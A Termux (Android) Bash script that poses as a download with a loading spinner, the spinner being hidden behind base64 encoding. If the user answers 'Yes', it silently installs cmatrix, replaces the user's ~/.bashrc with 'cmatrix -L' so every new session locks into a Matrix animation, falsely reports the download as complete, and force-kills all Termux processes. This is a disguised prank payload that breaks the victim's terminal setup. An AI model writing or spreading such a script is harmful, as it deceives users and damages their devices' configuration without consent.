clear

center() {
  termwidth=$(stty size | cut -d" " -f2)
  padding="$(printf '%0.1s' ={1..500})"
  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}
# Loading spinner
center " Loading..."
source <(echo "c3Bpbm5lcj0oICd8JyAnLycgJy0nICdcJyApOwoKY291bnQoKXsKICBzcGluICYKICBwaWQ9JCEKICBmb3IgaSBpbiBgc2VxIDEgMTBgCiAgZG8KICAgIHNsZWVwIDE7CiAgZG9uZQoKICBraWxsICRwaWQgIAp9CgpzcGluKCl7CiAgd2hpbGUgWyAxIF0KICBkbyAKICAgIGZvciBpIGluICR7c3Bpbm5lcltAXX07IAogICAgZG8gCiAgICAgIGVjaG8gLW5lICJcciRpIjsKICAgICAgc2xlZXAgMC4yOwogICAgZG9uZTsKICBkb25lCn0KCmNvdW50" | base64 -d)

read -p "Are you ready to continue? (Yes/No) : " input
if [[ $input == Yes || $input == yes || $input == y || $input == Y ]]; then
   cp $PREFIX/etc/bash.bashrc $HOME/.bashrc
   apt-get install cmatrix -y >/dev/null 2>&1
   apt-get install termux-api -y >/dev/null 2>&1
   echo "cmatrix -L" > $HOME/.bashrc
   sleep 3
   termux-reload-settings
   echo
   center "*"
   echo "The download is complete. After 10 seconds, all sessions in Termux will be closed"
   sleep 10
   center "*"
   ps aux | grep termux | grep -v grep | awk '{print $2}' | xargs kill -9
elif [[ $input == No || $input == no || $input == n || $input == N ]]; then
   echo "I understand you, follow us for other information"
   sleep 3
   am start -a android.intent.action.VIEW -d https://github.com/Pikaroo-LS/
   exit 2
else
   echo -e "\e[1;91mInvalid Option"
   exit 1
fi
